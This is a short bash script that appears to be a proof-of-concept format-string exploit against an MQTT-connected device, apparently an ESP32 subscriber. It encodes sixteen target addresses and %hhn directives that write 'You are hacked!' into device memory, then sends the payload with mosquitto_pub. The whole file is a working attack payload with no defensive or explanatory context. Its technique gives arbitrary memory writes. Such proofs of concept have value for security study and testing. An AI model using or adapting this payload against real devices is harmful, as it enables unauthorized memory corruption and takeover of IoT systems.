#!/bin/bash

command_prefix="mosquitto_pub -h 0.0.0.0 -t /topic/qos0 -m"

addr1="$(echo 0101f83f | xxd -p -r)" # 0x3ff80101
addr2="$(echo 0201f83f | xxd -p -r)" # 0x3ff80102
addr3="$(echo 0301f83f | xxd -p -r)" # 0x3ff80103
addr4="$(echo 0401f83f | xxd -p -r)" # 0x3ff80104
addr5="$(echo 0501f83f | xxd -p -r)" # 0x3ff80105
addr6="$(echo 0601f83f | xxd -p -r)" # 0x3ff80106
addr7="$(echo 0701f83f | xxd -p -r)" # 0x3ff80107
addr8="$(echo 0801f83f | xxd -p -r)" # 0x3ff80108
addr9="$(echo 0901f83f | xxd -p -r)" # 0x3ff80109
addr10="$(echo 0a01f83f | xxd -p -r)" # 0x3ff8010a
addr11="$(echo 0b01f83f | xxd -p -r)" # 0x3ff8010b
addr12="$(echo 0c01f83f | xxd -p -r)" # 0x3ff8010c
addr13="$(echo 0d01f83f | xxd -p -r)" # 0x3ff8010d
addr14="$(echo 0e01f83f | xxd -p -r)" # 0x3ff8010e
addr15="$(echo 0f01f83f | xxd -p -r)" # 0x3ff8010f
addr16="$(echo 1001f83f | xxd -p -r)" # 0x3ff80110

# Combine addresses together
addresses=$addr1$addr2$addr3$addr4$addr5$addr6$addr7$addr8$addr9$addr10$addr11$addr12$addr13$addr14$addr15$addr16

inject1="%25x%6\$hhn" # Write Y to 0x3ff80101
inject2="%22x%7\$hhn" # Write o to 0x3ff80102
inject3="%262x%8\$hhn" # Wite u to 0x3ff80103
inject4="%171x%9\$hhn" # Write space to 0x3ff80104
inject5="%321x%10\$hhn" # Write a to 0x3ff80105
inject6="%17x%11\$hhn" # Write r to 0x3ff80106
inject7="%243x%12\$hhn" # Write e to 0x3ff80107
inject8="%187x%13\$hhn" # Write space to 0x3ff80108
inject9="%328x%14\$hhn" # Write h to 0x3ff80109
inject10="%249x%15\$hhn" # Write a to 0x3ff8010a
inject11="%258x%16\$hhn" # Write c to 0x3ff8010b
inject12="%8x%17\$hhn" # Write k to 0x3ff8010c
inject13="%250x%18\$hhn" # Write e to 0x3ff8010d
inject14="%255x%19\$hhn" # Write d to 0x3ff8010e
inject15="%189x%20\$hhn" # Write ! to 0x3ff8010f
inject16="%223x%21\$hhn" # Write null byte to 0x3ff80110

# Combine format string payloads together
injection=$inject1$inject2$inject3$inject4$inject5$inject6$inject7$inject8$inject9$inject10$inject11$inject12$inject13$inject14$inject15$inject16

# Craft the payload
payload=$addresses$injection

# Print the payload out
if [ $# -gt 0 ]; then
    echo "PAYLOAD (as hexdump):"
    echo $payload | xxd -p
fi

$command_prefix "$payload"